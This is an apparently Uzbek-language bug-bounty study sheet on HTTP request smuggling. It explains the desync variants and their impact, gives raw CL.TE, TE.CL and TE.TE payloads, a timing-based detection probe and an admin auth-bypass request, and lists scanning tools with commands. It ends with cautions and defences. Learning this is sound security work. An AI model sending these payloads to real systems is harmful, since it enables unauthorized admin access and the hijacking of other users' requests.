# HTTP Request Smuggling (Desync)

> Lab yechimlari (PortSwigger'ning 22 ta labi) → `LABS.md`. Bu fayl — to'liq nazariya + payload + tool.

## Nima bu? (tushuncha)
Zamonaviy saytlarda so'rov zanjir bo'ylab ketadi: front-end (CDN/proxy/load balancer) → back-end.
Ikkalasi ham so'rov **qayerda tugashini** aniqlashi kerak. Agar ular buni **turlicha** aniqlasa
(desync), sen bitta so'rov ichiga ikkinchi, **yashirin so'rovni** tiqasan. Front-end uni bitta
so'rov deb o'tkazadi, back-end esa ikkiga bo'ladi — yashirin qism keyingi foydalanuvchining
so'rovi oldiga **yopishib** ketadi va uni buzadi/o'g'irlaydi.

**Ildiz sabab:** HTTP/1.1'da so'rov uzunligini **ikki usul** aytadi: `Content-Length` (CL) va
`Transfer-Encoding: chunked` (TE). Agar front-end birini, back-end boshqasini afzal ko'rsa — yoki
HTTP/2 downgrade'da noaniqlik bo'lsa — desync yuzaga keladi. Ya'ni muammo bitta serverda emas,
**ikki server o'rtasidagi kelishmovchilikda**.

## Turlari
- **CL.TE** — front-end CL, back-end TE ishlatadi.
- **TE.CL** — front-end TE, back-end CL ishlatadi.
- **TE.TE** — ikkisi ham TE, lekin birini obfuscate qilib aldaysan.
- **CL.0** — back-end ba'zi endpointda CL ni e'tiborsiz qoldiradi (0 deb).
- **0.CL** — teskarisi (front-end CL ni e'tiborsiz qoldiradi).
- **H2.CL / H2.TE** — HTTP/2 → HTTP/1 downgrade'da ambiguous length.
- **H2 CRLF injection / request tunnelling** — HTTP/2 header'ga CRLF yoki tunnel.
- **Client-side / pause-based desync** — browser yoki timeout orqali desync.

## Oqibatlar (IMPACT)
- **Boshqa odamning so'rovini/sessiyasini o'g'irlash** (response queue poisoning, capture).
- Front-end auth himoyasini chetlab **admin'ga kirish** (`Host: localhost` smuggle).
- Reflected XSS'ni **hamma foydalanuvchiga** tarqatish (cache bilan).
- Credential/CSRF token yig'ib olish.
> Odatda **High/Critical** — chunki boshqa foydalanuvchilarга ta'sir qiladi, qurbon kerak emas.

## Turlari
```http
# CL.TE — front CL, back TE
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```
```http
# TE.CL — front TE, back CL
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST /admin ...
```
```http
# TE.TE — obfuscatsiya bilan biri TE'ni e'tiborsiz qoldiradi
Transfer-Encoding: chunked
Transfer-Encoding: x
 Transfer-Encoding: chunked    (oldida probel)
```
`H2.CL / H2.TE` — HTTP/2 → HTTP/1.1 downgrade smuggling.

## Aniqlash (timing bilan — xavfsiz)
```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```
> Back javob kutib qotib qolsa (delay) — desync bor. Timing-based eng xavfsiz, boshqa userга tegmaydi.

## Exploit — front auth bypass
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
X-Ignore: X
```
> Front `/admin`'ni ko'rmaydi (yashirin), back bajaradi.

## TOOLLAR

### Burp HTTP Request Smuggler — podshosi (James Kettle)
```
Burp extension → o'ng tugma → "Smuggle probe" / "Launch all scans"
```
> CL.TE/TE.CL/TE.TE va HTTP/2 variantlarini avtomat timing bilan aniqlaydi, keyin exploit yasaydi. Boshqa userга ta'sir qilmasdan tekshiradi.

### smuggler.py — tez CLI detect
```bash
python3 smuggler.py -u https://target.com
```
> URL'ni olib, hamma desync texnikasini (mutation bilan) ketma-ket sinaydi.

### h2csmuggler — HTTP/2 cleartext upgrade smuggling
```bash
python3 h2csmuggler.py -x https://target.com --test
```
> Proxy `h2c` upgrade'ga ruxsat bersa — tunnel ochib, oldingi himoyani butunlay chetlaydi.

### turbo intruder — maxsus desync payload
```python
# Burp Turbo Intruder — pipelining bilan aniq smuggle payload yuborasan
```
> Qo'lda yasagan CL.TE/TE.CL payloadni bir ulanishda ketma-ket, aniq timing bilan yuboradi.

## Ehtiyot
Faqat timing-based detection'dan boshla. Exploit boshqa real userларга ta'sir qilishi
mumkin — ehtiyot bo'l, DoS/ommaviy zarar BBP'ni buzadi.

## Himoya
Front va back bitta HTTP implementatsiya, ambigu so'rovni (CL+TE birga) rad etish,
HTTP/2 end-to-end (downgrade yo'q).
